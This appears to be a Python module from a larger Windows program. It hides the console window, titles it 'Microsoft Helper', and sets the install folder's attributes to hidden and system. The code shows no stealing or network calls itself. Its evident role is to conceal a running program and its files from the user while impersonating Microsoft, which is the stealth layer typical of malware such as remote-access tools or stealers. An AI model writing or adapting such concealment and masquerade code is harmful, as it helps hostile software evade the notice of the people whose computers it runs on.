import ctypes
import os

from core.paths import INSTALL, runtime_dir

APP = 'MicrosoftHelper'

_ATTR_HIDDEN = 0x02
_ATTR_SYSTEM = 0x04


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def set_title(t):
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(t)
    except Exception:
        pass


def hide_path(p=None):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(p or INSTALL), _ATTR_HIDDEN | _ATTR_SYSTEM)
    except Exception:
        pass


def unhide_path(p=None):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(p or INSTALL), 0x80)
    except Exception:
        pass


def workdir():
    d = runtime_dir()
    if d.exists():
        try:
            os.chdir(d)
        except Exception:
            pass
    return d


def apply():
    hide_console()
    set_title('Microsoft Helper')
    workdir()